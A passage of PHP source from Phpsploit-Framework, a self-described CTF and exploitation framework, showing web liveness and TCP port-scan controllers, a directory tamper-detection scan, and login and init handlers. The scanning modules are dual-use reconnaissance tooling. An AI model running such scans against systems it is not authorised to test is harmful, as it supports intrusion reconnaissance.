    public static function dec_to_hex ( $dec , $hex_string_length = 16 )
    {
        if ( ! is_integer ( $dec ) ) {
            $dec = intval ( $dec );
        }
        $_hex     = dechex ( $dec );
        $_hex_len = strlen ( $_hex );
        if ( $_hex_len < $hex_string_length ) {
            $_hex = str_pad ( $_hex , $hex_string_length , chr ( 48 ) , STR_PAD_LEFT );
        }
        return $_hex;
    }
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-2-22
 * Time: 下午10:27
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

interface Interface_Base_ResourceType extends Interface_Base
{
    const TYPE_RESOURCE_SOCKET = "Socket";
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-5-2
 * Time: 下午1:02
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_Controller_Scan
{
    public static function index ( $params = array () )
    {
        if ( ( ! is_cli () ) && ( ! Class_Base_Auth ::is_login () ) ) {
            Class_Base_Response ::redirect ( "/login" );
            return null;
        }
        Class_Base_Auth ::check_permission ();
        if ( ! is_cli () ) {
            $_top    = Class_View_Top ::top ();
            $_body   = array (
                "menu"    => Class_View_Scan_Menu ::menu () ,
                "content" => "" ,
            );
            $_bottom = Class_View_Bottom ::bottom ();
            Class_Base_Response ::output ( Class_View ::index ( $_top , $_body , $_bottom ) , "text" , 0 );
        }
        return null;
    }

    public static function webs ( $params = array () )
    {
        if ( ( ! is_cli () ) && ( ! Class_Base_Auth ::is_login () ) ) {
            Class_Base_Response ::redirect ( "/login" );
            return null;
        }
        Class_Base_Auth ::check_permission ();
        $_start                   = Class_Base_Request ::form ( "start" , Class_Base_Request::TYPE_INTEGER , 0 );
        $_webs                    = Class_Base_Request ::form ( "webs" , Class_Base_Request::TYPE_STRING , "" );
        $_webs                    = str_replace ( chr ( 13 ) , "" , str_replace ( chr ( 10 ) , "" , str_replace ( chr ( 32 ) , "" , $_webs ) ) );
        $_webs_length             = strlen ( $_webs );
        $_webs_fast_char_position = ( $_webs_length - 1 );
        $_webs                    = ( ( $_webs_length > 0 ) ? ( ( substr ( $_webs , $_webs_fast_char_position , 1 ) == chr ( 44 ) ) ? ( ( $_webs_length > 1 ) ? ( substr ( $_webs , 0 , $_webs_fast_char_position ) ) : ( "" ) ) : ( $_webs ) ) : ( "" ) );
        $_web_array               = explode ( chr ( 44 ) , $_webs );
        $_web_array               = array_unique ( $_web_array );
        $_webs_count              = count ( $_web_array );
        if ( $_webs_count > 8 ) {
            throw new \Exception( "The number of web sites for survival testing cannot exceed 8" , 0 );
        }
        $_result           = array ();
        $_web_domain_names = array ();
        if ( ( ! empty( $_start ) ) && ( $_webs_count > 0 ) ) {
            $_result = Class_Operate_Scan ::request_webs ( $_web_array );
            if ( ( ! empty( $_result ) ) && ( is_array ( $_result ) ) ) {
                $_web_domain_names = array_keys ( $_result );
            }
        } else {
            $_web_domain_names = $_web_array;
        }

        if ( ! is_cli () ) {
            $_cli_url        = Class_Base_Response ::get_cli_url ( "/scan/webs" , array ( 'start' => 1 , 'webs' => $_webs , ) );
            $_cli_encode_url = Class_Base_Response ::get_urlencode ( $_cli_url );
            $_form_top       = '<div style="margin-top:64px;margin-bottom:16px;height: 32px;text-align: center;font-size: 18px;">Web Activity Status Detection</div>';
            $_form_top       .= '<div style="margin-top:16px;text-align: left;font-size: 18px;"><span style="font-size: 18px;color:red;">This module function is used to scan the survival status of WEB sites in the specified list (list elements include IP addresses, host names, or domain names, etc., separated by commas between elements in the list, for example: http://localhost , http://127.0.0.1 , https://localhost , https://127.0.0.1 , http://localhost:8080 , http://127.0.0.1:8080 , https://localhost:4443 , https://127.0.0.1:4443 ）</div>';
            $_form_name      = "form_0";
            $_form           = array (
                "action"    => "/scan/webs" ,
                "id"        => $_form_name ,
                "name"      => $_form_name ,
                "hiddens"   => array (
                    array (
                        "id"    => "start" ,
                        "name"  => "start" ,
                        "value" => 1 ,
                    ) ,
                ) ,
                "selects"   => array () ,
                "inputs"    => array () ,
                "textareas" => array (
                    array (
                        "id"    => "request_webs" ,
                        "title" => "( Request Domain )   : " ,
                        "name"  => "webs" ,
                        "value" => ( implode ( chr ( 44 ) , $_web_domain_names ) ) ,
                    ) ,
                    array (
                        "id"       => "response_http_code" ,
                        "title"    => "( Http Code Result )   : " ,
                        "name"     => "result" ,
                        "value"    => ( print_r ( $_result , true ) ) ,
                        "disabled" => "disabled" ,
                    ) ,
                    array (
                        "id"       => "cli_encode_url" ,
                        "title"    => "( Cli Encode URL )   : " ,
                        "name"     => "cli_encode_url" ,
                        "value"    => ( 'cli url : ' . $_cli_url . "\n\n" . 'cli encode url : ' . $_cli_encode_url . "\n\n" ) ,
                        "disabled" => "disabled" ,
                        "style"    => 'height:400px;' ,
                    ) ,
                ) ,
                "submit"    => array (
                    "id"    => "submit_form" ,
                    "type"  => "submit" ,
                    "title" => "( Start Scan Webs )" ,
                    "name"  => "submit_form" ,
                    "value" => "start scan webs" ,
                ) ,
                "reset"     => array (
                    "id"    => "reset_form" ,
                    "type"  => "reset" ,
                    "title" => "( Reset Scan Configuration Information )" ,
                    "name"  => "reset_form" ,
                    "value" => "reset configuration" ,
                ) ,
                "button"    => array (
                    "id"      => "button_form" ,
                    "type"    => "button" ,
                    "title"   => "( Create Scan Environment CLI Encode URL )" ,
                    "name"    => "button_form" ,
                    "value"   => "create cli encode url" ,
                    "display" => true ,
                    "events"  => array (
                        "onclick" => 'create_encode_url();' ,
                    ) ,
                ) ,
            );
            $_top            = Class_View_Top ::top ();
            $_body           = array (
                "menu"    => Class_View_Scan_Menu ::menu ( array () ) ,
                "content" => ( ( $_form_top ) . Class_View ::form_body ( $_form ) ) ,
            );
            $_bottom_menu    = array (
                array (
                    "title"    => "" ,
                    "describe" => "" ,
                    "href"     => "#" ,
                ) ,
            );
            $_content        = '<div></div>';
            $_javascript     = '<script type="text/javascript">function init(){ } function to_submit(form_object){  console.log("form is submit"); return true;} function create_encode_url(){ document.getElementById("start").value=0;if(document.forms["' . htmlentities ( $_form_name ) . '"].onsubmit()!=false){document.forms["' . htmlentities ( $_form_name ) . '"].submit();} }</script>';
            $_bottom         = Class_View_Bottom ::bottom ( $_bottom_menu , $_content , $_javascript );
            Class_Base_Response ::output ( Class_View ::index ( $_top , $_body , $_bottom ) , "text" , 0 );
        } else {
            Class_Base_Response ::outputln ( $_result );
        }
        return null;
    }

    public static function domain ( $params = array () )
    {
        if ( ( ! is_cli () ) && ( ! Class_Base_Auth ::is_login () ) ) {
            Class_Base_Response ::redirect ( "/login" );
            return null;
        }
        Class_Base_Auth ::check_permission ();
        $_start                    = Class_Base_Request ::form ( "start" , Class_Base_Request::TYPE_INTEGER , 0 );
        $_ip                       = Class_Base_Request ::form ( "ip" , Class_Base_Request::TYPE_STRING , "" );
        $_ports                    = Class_Base_Request ::form ( "ports" , Class_Base_Request::TYPE_STRING , "" );
        $_ip                       = str_replace ( chr ( 13 ) , "" , str_replace ( chr ( 10 ) , "" , str_replace ( chr ( 32 ) , "" , $_ip ) ) );
        $_ports                    = str_replace ( chr ( 13 ) , "" , str_replace ( chr ( 10 ) , "" , str_replace ( chr ( 32 ) , "" , $_ports ) ) );
        $_ports_length             = strlen ( $_ports );
        $_ports_fast_char_position = ( $_ports_length - 1 );
        $_ports                    = ( ( $_ports_length > 0 ) ? ( ( substr ( $_ports , $_ports_fast_char_position , 1 ) == chr ( 44 ) ) ? ( ( $_ports_length > 1 ) ? ( substr ( $_ports , 0 , $_ports_fast_char_position ) ) : ( "" ) ) : ( $_ports ) ) : ( "" ) );
        $_port_array               = explode ( chr ( 44 ) , $_ports );
        $_port_array               = array_unique ( $_port_array );
        $_ports_count              = count ( $_port_array );
        if ( $_ports_count > 8 ) {
            throw new \Exception( "The number of domain ports for survival testing cannot exceed 8" , 0 );
        }
        $_result = array ();
        if ( ( ! empty( $_start ) ) && ( ! empty( $_ip ) ) && ( $_ports_count > 0 ) ) {
            $_result = Class_Operate_Scan ::request_domain_ports ( $_ip , $_port_array );
        }
        if ( ! is_cli () ) {
            $_cli_url        = Class_Base_Response ::get_cli_url ( "/scan/domain" , array ( 'start' => 1 , 'ip' => $_ip , 'ports' => $_ports , ) );
            $_cli_encode_url = Class_Base_Response ::get_urlencode ( $_cli_url );
            $_form_top       = '<div style="margin-top:64px;margin-bottom:16px;height: 32px;text-align: center;font-size: 18px;">Domain Port Activity Status Detection</div>';
            $_form_top       .= '<div style="margin-top:16px;text-align: left;font-size: 18px;"><span style="font-size: 18px;color:red;">This module function is used to scan the response status of TCP protocol ports in a specified host (the list element is the port number, separated by commas between the elements in the list, examples: 22, 80, 443, 3306).</div>';
            $_form_name      = "form_0";
            $_form           = array (
                "action"    => "/scan/domain" ,
                "id"        => $_form_name ,
                "name"      => $_form_name ,
                "hiddens"   => array (
                    array (
                        "id"    => "start" ,
                        "name"  => "start" ,
                        "value" => 1 ,
                    ) ,
                ) ,
                "selects"   => array () ,
                "inputs"    => array (
                    array (
                        "id"       => "request_ip" ,
                        "title"    => "Domain IP Address : " ,
                        "describe" => "domain ip address" ,
                        "name"     => "ip" ,
                        "value"    => $_ip ,
                    ) ,
                ) ,
                "textareas" => array (
                    array (
                        "id"    => "request_ports" ,
                        "title" => "( Request Ports )   : " ,
                        "name"  => "ports" ,
                        "value" => ( implode ( chr ( 44 ) , $_port_array ) ) ,
                    ) ,
                    array (
                        "id"       => "response_port_status" ,
                        "title"    => "( Port Status )   : " ,
                        "name"     => "result" ,
                        "value"    => ( print_r ( $_result , true ) ) ,
                        "disabled" => "disabled" ,
                    ) ,
                    array (
                        "id"       => "cli_encode_url" ,
                        "title"    => "( Cli Encode URL )   : " ,
                        "name"     => "cli_encode_url" ,
                        "value"    => ( 'cli url : ' . $_cli_url . "\n\n" . 'cli encode url : ' . $_cli_encode_url . "\n\n" ) ,
                        "disabled" => "disabled" ,
                        "style"    => 'height:400px;' ,
                    ) ,
                ) ,
                "submit"    => array (
                    "id"    => "submit_form" ,
                    "type"  => "submit" ,
                    "title" => "( Start Scan Domain )" ,
                    "name"  => "submit_form" ,
                    "value" => "start scan ports" ,
                ) ,
                "reset"     => array (
                    "id"    => "reset_form" ,
                    "type"  => "reset" ,
                    "title" => "( Reset Scan Configuration Information )" ,
                    "name"  => "reset_form" ,
                    "value" => "reset configuration" ,
                ) ,
                "button"    => array (
                    "id"      => "button_form" ,
                    "type"    => "button" ,
                    "title"   => "( Create Scan Environment CLI Encode URL )" ,
                    "name"    => "button_form" ,
                    "value"   => "create cli encode url" ,
                    "display" => true ,
                    "events"  => array (
                        "onclick" => 'create_encode_url();' ,
                    ) ,
                ) ,
            );
            $_top            = Class_View_Top ::top ();
            $_body           = array (
                "menu"    => Class_View_Scan_Menu ::menu ( array () ) ,
                "content" => ( ( $_form_top ) . Class_View ::form_body ( $_form ) ) ,
            );
            $_bottom_menu    = array (
                array (
                    "title"    => "" ,
                    "describe" => "" ,
                    "href"     => "#" ,
                ) ,
            );
            $_content        = '<div></div>';
            $_javascript     = '<script type="text/javascript">function init(){ } function to_submit(form_object){  console.log("form is submit"); return true;} function create_encode_url(){ document.getElementById("start").value=0;if(document.forms["' . htmlentities ( $_form_name ) . '"].onsubmit()!=false){document.forms["' . htmlentities ( $_form_name ) . '"].submit();} }</script>';
            $_bottom         = Class_View_Bottom ::bottom ( $_bottom_menu , $_content , $_javascript );
            Class_Base_Response ::output ( Class_View ::index ( $_top , $_body , $_bottom ) , "text" , 0 );
        } else {
            Class_Base_Response ::outputln ( $_result );
        }
        return null;
    }

    public static function tamperproof ( $params = array () )
    {
        if ( ( ! is_cli () ) && ( ! Class_Base_Auth ::is_login () ) ) {
            Class_Base_Response ::redirect ( "/login" );
            return null;
        }
        Class_Base_Auth ::check_permission ();
        $_start                    = Class_Base_Request ::form ( "start" , Class_Base_Request::TYPE_INTEGER , 0 );
        $_sampling_directory_path  = Class_Base_Request ::form ( "sampling_directory_path" , Class_Base_Request::TYPE_STRING , "" );
        $_detection_directory_path = Class_Base_Request ::form ( "detection_directory_path" , Class_Base_Request::TYPE_STRING , "" );
        if ( ! is_cli () ) {
            $_cli_url                      = Class_Base_Response ::get_cli_url ( "/scan/tamperproof" , array ( 'start' => 1 , 'sampling_directory_path' => $_sampling_directory_path , 'detection_directory_path' => $_detection_directory_path , ) );
            $_cli_encode_url               = Class_Base_Response ::get_urlencode ( $_cli_url );
            $_form_top                     = '<div style="margin-top:64px;margin-bottom:16px;height: 32px;text-align: center;font-size: 18px;">Abnormal Directory And File Detection</div>';
            $_form_top                     .= '<div style="margin-top:16px;text-align: left;font-size: 18px;"><span style="font-size: 18px;color:red;">This module uses file detection technology to perform security scans on specified directories (such as web directories), and provides relevant prompts and warnings for discovered risks. This feature helps operations engineers or blue team members in CTF competitions to conduct web file security checks.</div>';
            $_form_name                    = "form_0";
            $_form                         = array (
                "action"    => "/scan/tamperproof" ,
                "id"        => $_form_name ,
                "name"      => $_form_name ,
                "hiddens"   => array (
                    array (
                        "id"    => "start" ,
                        "name"  => "start" ,
                        "value" => 1 ,
                    ) ,
                ) ,
                "selects"   => array () ,
                "inputs"    => array (
                    array (
                        "id"       => "sampling_directory_path" ,
                        "title"    => "Sampling Directory : " ,
                        "describe" => "Sampling Directory" ,
                        "name"     => "sampling_directory_path" ,
                        "value"    => $_sampling_directory_path ,
                    ) ,
                    array (
                        "id"       => "detection_directory_path" ,
                        "title"    => "Detection Directory : " ,
                        "describe" => "Detection Directory" ,
                        "name"     => "detection_directory_path" ,
                        "value"    => $_detection_directory_path ,
                    ) ,
                ) ,
                "textareas" => array (
                    array (
                        "id"       => "cli_encode_url" ,
                        "title"    => "( Cli Encode URL )   : " ,
                        "name"     => "cli_encode_url" ,
                        "value"    => ( 'cli url : ' . $_cli_url . "\n\n" . 'cli encode url : ' . $_cli_encode_url . "\n\n" ) ,
                        "disabled" => "disabled" ,
                        "style"    => 'height:400px;' ,
                    ) ,
                ) ,
                "submit"    => array (
                    "id"    => "submit_form" ,
                    "type"  => "submit" ,
                    "title" => "( Start Scan Tamperproof )" ,
                    "name"  => "submit_form" ,
                    "value" => "start scan tamperproof" ,
                ) ,
                "reset"     => array (
                    "id"    => "reset_form" ,
                    "type"  => "reset" ,
                    "title" => "( Reset Scan Configuration Information )" ,
                    "name"  => "reset_form" ,
                    "value" => "reset configuration" ,
                ) ,
                "button"    => array (
                    "id"      => "button_form" ,
                    "type"    => "button" ,
                    "title"   => "( Create Scan Environment CLI Encode URL )" ,
                    "name"    => "button_form" ,
                    "value"   => "create cli encode url" ,
                    "display" => true ,
                    "events"  => array (
                        "onclick" => 'create_encode_url();' ,
                    ) ,
                ) ,
            );
            $_top                          = Class_View_Top ::top ();
            $_body                         = array (
                "menu"    => Class_View_Scan_Menu ::menu ( array () ) ,
                "content" => ( ( $_form_top ) . Class_View ::form_body ( $_form ) ) ,
            );
            $_bottom_menu                  = array (
                array (
                    "title"    => "" ,
                    "describe" => "" ,
                    "href"     => "#" ,
                ) ,
            );
            $_search_sampling_progress_id  = "search_sampling_progress";
            $_search_detection_progress_id = "search_detection_progress";
            $_search_errors_id             = "search_errors";
            $_search_result_id             = "search_result";
            $_content                      = '<div style="padding-top:16px;padding-bottom:16px;text-align: center;font-size:18px;">Search Sampling Progress</div><div id="' . $_search_sampling_progress_id . '" style="padding-top:16px;padding-bottom:16px;text-align: center;font-size:18px;"></div><div style="padding-top:16px;padding-bottom:16px;text-align: center;font-size:18px;">Search Detection Progress</div><div id="' . $_search_detection_progress_id . '" style="padding-top:16px;padding-bottom:16px;text-align: center;font-size:18px;"></div><div style="padding-top:16px;padding-bottom:16px;text-align: center;font-size:18px;">Search Errors</div><div id="' . $_search_errors_id . '" style="padding-top:16px;padding-bottom:16px;text-align: center;font-size:18px;"></div><div style="padding-top:16px;padding-bottom:16px;text-align: center;font-size:18px;">Search Result</div><div id="' . $_search_result_id . '" style="padding-top:16px;padding-bottom:16px;text-align: left;font-size:18px;"></div>';
            $_javascript                   = '<script type="text/javascript">function init(){ } function to_submit(form_object){  console.log("form is submit"); return true;} function create_encode_url(){ document.getElementById("start").value=0;if(document.forms["' . htmlentities ( $_form_name ) . '"].onsubmit()!=false){document.forms["' . htmlentities ( $_form_name ) . '"].submit();} }</script>';
            $_bottom                       = Class_View_Bottom ::bottom ( $_bottom_menu , $_content , $_javascript );
            Class_Base_Response ::output ( Class_View ::index ( $_top , $_body , $_bottom ) , "text" , 0 );

            if ( ( ! empty( $_start ) ) && ( is_string ( $_sampling_directory_path ) ) && ( strlen ( $_sampling_directory_path ) > 0 ) && ( is_string ( $_detection_directory_path ) ) && ( strlen ( $_detection_directory_path ) > 0 ) ) {
                Class_Operate_Scan ::scan_directory_exception ( $_sampling_directory_path , $_detection_directory_path , $_search_sampling_progress_id , $_search_detection_progress_id , $_search_errors_id , $_search_result_id , 100 , 0 );
            }
            if ( ! is_cli () ) {
                Class_Base_Response ::output_div_inner_html ( $_search_sampling_progress_id , "" , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_COVER );
            }
            if ( ! is_cli () ) {
                Class_Base_Response ::output_div_inner_html ( $_search_detection_progress_id , "" , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_COVER );
            }

        } else {
            if ( ( ! empty( $_start ) ) && ( is_string ( $_sampling_directory_path ) ) && ( strlen ( $_sampling_directory_path ) > 0 ) && ( is_string ( $_detection_directory_path ) ) && ( strlen ( $_detection_directory_path ) > 0 ) ) {
                Class_Operate_Scan ::scan_directory_exception ( $_sampling_directory_path , $_detection_directory_path , $_search_sampling_progress_id , $_search_detection_progress_id , $_search_errors_id , $_search_result_id , 100 , 0 );
            }
        }
        return null;
    }
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-5-23
 * Time: 上午11:53
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_Controller_Init
{
    public static function index ( $params = array () )
    {
        $_is_enable_license_agreement = Class_Base_Request ::form ( "is_enable_license_agreement" , Class_Base_Request::TYPE_INTEGER , 0 );
        if ( ! empty( $_is_enable_license_agreement ) ) {
            Class_Base_Auth ::enable_license_agreement ();
        }
        if ( ! ( Class_Base_Auth ::is_enable_license_agreement () ) ) {
            Class_Base_Response ::redirect ( "/" );
            return null;
        }
        if ( ( Class_Base_Auth ::is_login () ) ) {
            Class_Base_Response ::redirect ( "/index" );
            return null;
        }
        if ( Class_Operate_User ::exist_token () ) {
            Class_Base_Response ::redirect ( "/login" );
            return null;
        }
        if ( ! Class_Base_Extension ::exist_enabled_extensions ( Class_Base_Extension::EXTENSION_NAME_SHMOP ) ) {
            Class_Base_Response ::redirect ( "/login" );
            return null;
        }
        $_privilege_user     = Class_Base_Request ::form ( "privilege_user" , Class_Base_Request::TYPE_STRING , "" );
        $_privilege_password = Class_Base_Request ::form ( "privilege_password" , Class_Base_Request::TYPE_STRING , "" );
        if ( ! is_cli () ) {
            $_view_data = array ( 'privilege_user' => $_privilege_user , 'privilege_password' => $_privilege_password );
            Class_Base_Response ::output ( Class_View_Init ::init ( $_view_data ) , "text" , 0 );
        } else {
            Class_Base_Response ::output ( "\n" . Class_Base_Response ::get_encode_cli_url ( "/init_user_info" , array ( "privilege_user" => $_privilege_user , "privilege_password" => $_privilege_password ) ) . "\n" , "text" , 0 );
        }
        return null;
    }

    public static function init_user_info ( $params = array () )
    {
        if ( is_cli () ) {
            global $_SESSION;
            if ( ! is_array ( $_SESSION ) ) {
                $_SESSION = array ();
            }
        }
        if ( ! ( Class_Base_Auth ::is_enable_license_agreement () ) ) {
            if ( ! is_cli () ) {
                Class_Base_Response ::redirect ( "/" );
                return null;
            } else {
                Class_Base_Auth ::cli_show_license_agreement ();
            }
        }
        if ( ( Class_Base_Auth ::is_login () ) ) {
            Class_Base_Response ::redirect ( "/index" );
            return null;
        }
        $_privilege_user     = Class_Base_Request ::form ( "privilege_user" , Class_Base_Request::TYPE_STRING , "" );
        $_privilege_password = Class_Base_Request ::form ( "privilege_password" , Class_Base_Request::TYPE_STRING , "" );
        $_user                      = "";
        $_password                  = "";
        $_md5_token                 = "";
        if ( Class_Operate_User ::check_privilege_user_and_password ( $_privilege_user , $_privilege_password , $_user , $_password , $_md5_token ) ) {
            if ( ! is_cli () ) {
                if ( empty( $_user ) ) {
                    $_user      = ( ( empty( $_SESSION[ "PHPSPLOIT_FRAMEWORK_USER" ] ) ) ? ( "" ) : ( $_SESSION[ "PHPSPLOIT_FRAMEWORK_USER" ] ) );
                    $_password  = ( ( empty( $_SESSION[ "PHPSPLOIT_FRAMEWORK_PASSWORD" ] ) ) ? ( "" ) : ( $_SESSION[ "PHPSPLOIT_FRAMEWORK_PASSWORD" ] ) );
                    $_md5_token = ( ( empty( $_SESSION[ "PHPSPLOIT_FRAMEWORK_MD5_TOKEN" ] ) ) ? ( "" ) : ( $_SESSION[ "PHPSPLOIT_FRAMEWORK_MD5_TOKEN" ] ) );
                }
                $_view_data = array ( 'privilege_user' => $_privilege_user , 'privilege_password' => $_privilege_password , 'user' => $_user , 'password' => $_password , 'md5_token' => $_md5_token );
                Class_Base_Response ::output ( Class_View_Init_User_Info ::init ( $_view_data ) , "text" , 0 );
            } else {
                Class_Base_Response ::output ( array ( 'privilege_user' => $_privilege_user , 'privilege_password' => $_privilege_password , 'user' => $_user , 'password' => $_password , 'md5_token' => $_md5_token ) , "json" );
            }
        } else {
            if ( ! is_cli () ) {
                Class_Base_Response ::redirect ( "/init" , array ( "privilege_user" => $_privilege_user , "privilege_password" => $_privilege_password ) );
            } else {
                Class_Base_Response ::outputln ( "\nAccount initialization or password input error , please double check and try again ! " );
            }
        }
        return null;
    }
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-2-23
 * Time: 下午1:24
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

interface Interface_Base_Block_Data extends Interface_Base
{

}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-2-23
 * Time: 下午1:24
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

interface Interface_Controller_ChatServer extends Interface_Controller
{

}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-4-7
 * Time: 下午1:19
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_Controller_Login extends Class_Controller
{
    public static function index ( $params = array () )
    {
        $_is_enable_license_agreement = Class_Base_Request::form ( "is_enable_license_agreement" , Class_Base_Request::TYPE_INTEGER , 0 );
        if ( ! empty( $_is_enable_license_agreement ) ) {
            Class_Base_Auth::enable_license_agreement ();
        }
        if ( ! ( Class_Base_Auth::is_enable_license_agreement () ) ) {
            Class_Base_Response::redirect ( "/" );
            return null;
        }
        if ( ! Class_Operate_User::exist_token () ) {
            Class_Base_Auth::clear ();
            Class_Base_Response::redirect ( "/init" );
            return null;
        }
        if ( ( Class_Base_Auth::is_login () ) ) {
            Class_Base_Response::redirect ( "/index" );
            return null;
        }
        $_user      = Class_Base_Request::form ( "user" , Class_Base_Request::TYPE_STRING , "" );
        $_password  = Class_Base_Request::form ( "password" , Class_Base_Request::TYPE_STRING , "" );
        $_md5_token = "";
        if ( ( ! empty( $_user ) ) && ( ! empty( $_password ) ) ) {
            if ( Class_Operate_User::check_user_and_password ( $_user , $_password , $_md5_token ) ) {
                Class_Base_Auth::enable_login ();
                if ( ! is_cli () ) {
                    Class_Base_Response::redirect ( "/index" );
                } else {
                    Class_Base_Response::output ( array ( 'user' => $_user , 'password' => $_password , 'md5_token' => $_md5_token ) );
                }
                return null;
            }
        }
        if ( ! is_cli () ) {
            $_view_data = array ( 'user' => $_user , 'password' => $_password , );
            Class_Base_Response::output ( Class_View_Login::login ( $_view_data ) , "text" );
        }

        return null;
    }
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-4-8
 * Time: 下午3:40
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_View_Session_Menu
{
    private static $_menu = null;

    public static function menu ( $params = array () )
    {
        if ( ! is_array ( $params ) ) {
            $params = array ();
        }
        if ( empty( self::$_menu ) ) {
            self::$_menu = array (
                array (
                    "title"    => "session_info" ,
                    "describe" => "" ,
                    "href"     => Class_Base_Response::get_url ( "/session/session_info" , array () ) ,
                ) ,
            );
        }
        return self::$_menu;
    }
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 22-12-20
 * Time: 下午11:10
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_Controller_File_Upload extends Class_Controller
{
    public static function index ( $params = array () )
    {


        Class_Base_Response::output ( Class_View::index () );
    }
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-1-24
 * Time: 上午11:34
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_Operate_User extends Class_Operate implements Interface_Operate_User
{
